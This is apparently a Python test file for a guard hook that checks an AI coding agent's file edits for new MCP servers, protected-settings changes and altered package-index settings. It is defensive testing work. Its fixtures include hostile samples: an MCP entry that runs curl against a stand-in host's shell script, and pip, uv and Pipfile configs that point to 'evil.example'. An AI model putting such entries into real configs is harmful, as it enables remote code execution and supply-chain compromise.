"""Offline tests for hooks/pretooluse_editwrite_check.py (run: python3 tests/test_editwrite_hook.py).

Covers the MCP-config lag: the hook runs BEFORE the edit, so it must judge the edit's
resulting text, not the file on disk.
"""
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

IMPL = Path(__file__).resolve().parents[1] / "guard"
HOOK = IMPL / "hooks" / "pretooluse_editwrite_check.py"
_HOME = tempfile.mkdtemp()                                     # the snapshot lives in ~/.aegis (mcp_guard.SNAPSHOT_PATH)
SNAP = Path(_HOME) / ".aegis" / "mcp_snapshot.json"
FS = {"command": "npx", "args": ["@modelcontextprotocol/server-filesystem"]}


def run(event: dict) -> str:
    # AEGIS_MCP_SCAN=0: this file tests which MCP entries are new; scanning their packages is tests/test_mcp_scan.py (offline)
    env = {**os.environ, "AEGIS_MCP_SCAN": "0", "AEGIS_MODE": "user", "HOME": _HOME}   # the approval-window texts (auto: test_auto_events.py)
    out = subprocess.run([sys.executable, str(HOOK)], input=json.dumps(event), capture_output=True, text=True, env=env).stdout.strip()
    return json.loads(out)["hookSpecificOutput"]["permissionDecisionReason"] if out else ""


SNAP.unlink(missing_ok=True)
try:
    with tempfile.TemporaryDirectory() as d:
        cfg = Path(d) / ".mcp.json"
        cfg.write_text(json.dumps({"mcpServers": {"fs": FS}}, separators=(",", ":")))   # compact: the Edit cases match on exact text

        def write(servers):
            return run({"tool_name": "Write", "cwd": d, "tool_input": {"file_path": str(cfg), "content": json.dumps({"mcpServers": servers})}})

        evil = {"command": "npx", "args": ["evil-mcp-server"]}
        r = write({"fs": FS, "evil": evil})
        assert "evil" in r and r.startswith("[AegisPilot]") and len(r) <= 200, r
        assert "evil" in write({"fs": FS, "evil": evil}), "a rejected proposal must be flagged again"
        assert write({"fs": FS, "mem": {"command": "npx", "args": ["@modelcontextprotocol/server-memory"]}}) == ""
        r = run({"tool_name": "Edit", "cwd": d, "tool_input": {"file_path": str(cfg), "old_string": '{"mcpServers":{',
                                                           "new_string": '{"mcpServers":{"evil2":{"command":"curl","args":["http://x.example/s.sh"]},'}})
        assert "evil2" in r, r
        r = run({"tool_name": "MultiEdit", "cwd": d, "tool_input": {"file_path": str(cfg), "edits": [
            {"old_string": '{"mcpServers":{', "new_string": '{"mcpServers":{"evil3":{"command":"sh","args":["x"]},'}]}})
        assert "evil3" in r, r
        assert run({"tool_name": "Edit", "cwd": d, "tool_input": {"file_path": str(cfg), "old_string": '"args"', "new_string": '"args"'}}) == ""
        # creating the file with an unknown server is flagged too (nothing on disk yet)
        fresh = Path(d) / "sub" / ".mcp.json"
        fresh.parent.mkdir()
        r = run({"tool_name": "Write", "cwd": d, "tool_input": {"file_path": str(fresh), "content": json.dumps({"mcpServers": {"evil": evil}})}})
        assert "evil" in r, r
        # partial/invalid JSON in the proposal: nothing to judge, no crash
        assert run({"tool_name": "Write", "cwd": d, "tool_input": {"file_path": str(cfg), "content": "{not json"}}) == ""

    with tempfile.TemporaryDirectory() as d:
        r = run({"tool_name": "Edit", "cwd": d, "tool_input": {"file_path": "/p/.claude/settings.json", "old_string": "a", "new_string": "b"}})
        assert r.startswith("[AegisPilot] Guard setting change") and "If approved" in r and len(r) <= 200, r
        assert json.loads((Path(d) / ".aegis" / "last_review.json").read_text())["kind"] == "protected_path"
        assert run({"tool_name": "Write", "cwd": d, "tool_input": {"file_path": "/p/readme.md", "content": "x"}}) == ""

    # package index configs written with the file tools (the shell route was already caught by install_parse)
    with tempfile.TemporaryDirectory() as d:
        conf = Path(d) / "pip.conf"
        r = run({"tool_name": "Write", "cwd": d, "tool_input": {"file_path": str(conf),
                 "content": "[global]\nindex-url = https://evil.example/simple\n"}})
        assert "Package index setting changed" in r and "evil.example" in r and len(r) <= 200, r
        assert json.loads((Path(d) / ".aegis" / "last_review.json").read_text())["kind"] == "index_config"
        assert run({"tool_name": "Write", "cwd": d, "tool_input": {"file_path": str(conf),
                    "content": "[global]\nindex-url = https://pypi.org/simple\ntimeout = 30\n"}}) == ""
        # an index already in the file is not asked again on an unrelated edit; a new one is
        conf.write_text("[global]\nextra-index-url = https://mirror.corp.example/simple\n")
        assert run({"tool_name": "Edit", "cwd": d, "tool_input": {"file_path": str(conf), "old_string": "[global]\n",
                    "new_string": "[global]\ntimeout = 30\n"}}) == ""
        r = run({"tool_name": "Edit", "cwd": d, "tool_input": {"file_path": str(conf), "old_string": "[global]\n",
                 "new_string": "[global]\nfind-links = /tmp/wheels\n"}})
        assert "find-links" in r, r
        py = Path(d) / "pyproject.toml"
        py.write_text('[project]\nname = "app"\ndependencies = ["requests"]\n')
        assert run({"tool_name": "Edit", "cwd": d, "tool_input": {"file_path": str(py), "old_string": '["requests"]',
                    "new_string": '["requests", "rich"]'}}) == ""
        r = run({"tool_name": "Edit", "cwd": d, "tool_input": {"file_path": str(py), "old_string": '["requests"]\n',
                 "new_string": '["requests"]\n\n[[tool.uv.index]]\nname = "x"\nurl = "https://evil.example/simple"\n'}})
        assert "evil.example" in r, r
        r = run({"tool_name": "Write", "cwd": d, "tool_input": {"file_path": str(Path(d) / "Pipfile"),
                 "content": '[[source]]\nname = "e"\nurl = "https://evil.example/simple"\nverify_ssl = true\n'}})
        assert "evil.example" in r, r
finally:
    SNAP.unlink(missing_ok=True)
print("editwrite hook: all cases passed")
